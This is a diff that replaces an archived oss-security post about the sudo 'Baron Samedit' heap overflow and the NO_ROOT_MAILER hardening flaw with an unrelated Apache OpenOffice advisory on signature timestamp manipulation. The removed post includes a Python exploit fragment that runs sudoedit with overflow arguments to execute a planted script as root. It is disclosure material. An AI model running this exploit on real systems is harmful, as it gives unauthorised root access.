@@ -1,71 +1,24 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/02/15/1
-Message-ID: <2645-1613376404.018580@le5V.JgUV.WnPT>
-Date: Mon, 15 Feb 2021 08:06:44 +0000
-From: Roman Fiedler <roman.fiedler@...aralleled.eu>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/10/11/2
+Message-ID: <8bebbc45-baa9-c3fe-2114-786d6c70c440@apache.org>
+Date: Mon, 11 Oct 2021 03:05:11 +0000
+From: Dave Fisher <wave@...che.org>
 To: oss-security@...ts.openwall.com
-Subject: Re: sudo: Ineffective NO_ROOT_MAILER and Baron Samedit
+Subject: CVE-2021-41831: Apache OpenOffice: Timestamp Manipulation with Signature Wrapping 
 Content-Type: text/plain; charset=utf-8
 
-Roman Fiedler writes:
-> Hello list,
->
-> While reproducing the exploitation of "Baron Samedit" another
-> minor issue in Sudo was discovered. It affects Sudo 1.9.4
-> and newer and renders the "NO_ROOT_MAILER" hardening option
-> useless. While this bug by itself is not known to be exploitable
-> on its own, combining it with the "Baron Samedit" heap overflow
-> eases exploitation of the later tremendously.
-> ...
+Severity: moderate
 
-Now sudo patches are already deployed widely, so this is how
-the NO_ROOT_MAILER flag influenced exploit complexity:
+Description:
 
-* With "NO_ROOT_MAILER" working using "nss_load_library" method,
-e.g. implemented by blasty: main program
-https://github.com/blasty/CVE-2021-3156/blob/main/hax.c
-(140 lines with 18 lines header) and the library to be loaded
-https://github.com/blasty/CVE-2021-3156/blob/main/lib.c
-(16 lines), total 156 lines.
+It is possible for an attacker to manipulate the timestamp of signed documents.
 
-* Without "NO_ROOT_MAILER": love-letter-to-the-baron.py
-(43 lines with 18 lines header).
+All versions of Apache OpenOffice up to 4.1.10 are affected. Users are advised to update to version 4.1.11.
+
+See CVE-2021-25634 for the LibreOffice advisory.
 
 
-heraldName = '/tmp/XXXXXXXXXXXXXXXXXXXXXXXXX'
-heraldFd = os.open(heraldName, os.O_WRONLY|os.O_CREAT|os.O_TRUNC|os.O_NOCTTY)
-os.write(
-    heraldFd,
-    b'#!/bin/sh\ncat <<EOF > /the-letter.txt\nMy dearest Baron,...\n\nWith love,\nX*96\n\nLegal disclaimer:\n\n' + bytes(disclaimer, 'utf8') + b'\nEOF\n')
-os.fchmod(heraldFd, 0o755)
-os.close(heraldFd)
+Credit:
 
-devNullHandle = os.open('/dev/null', os.O_RDONLY)
-letterEnv = {
-    'LC_ALL': 'C.UTF-8',
-    'LANGUAGE': 'A'*84}
-letterArgs = [
-    '/usr/bin/sudoedit', '-S', '-s', '\\',
-    'X'*96 + heraldName]
-process = subprocess.Popen(
-    letterArgs, stdin=devNullHandle, env=letterEnv, cwd="/")
-process.wait()
-
-
-Note: I know that line numbers are not a perfect measure for
-complexity, it is just a very poor approximation.
-
-
-
-I also collected some historic information (software archeology)
-on the security-ping-pong around "NO_ROOT_MAILER" feature:
-https:///unparalleled.eu/blog/2021/20210215-a-love-letter-to-the-baron-part2/
-
-Kind regads,
-Roman
-
-| |  DI Roman Fiedler
-| /  roman.fiedler at unparalleled.eu  +43 677 63 29 28 29
-/ |  Unparalleled IT Services e.U.     FN: 516074h           VAT: ATU75050524
-| |  https://unparalleled.eu/          Felix-Dahn-Platz 4, 8010 Graz, Austria
+Apache OpenOffice would like to thank Simon Rohlmann, Vladislav Mladenov, Christian Mainka, and Jorg Schwenk of Ruhr University Bochum, Germany
 
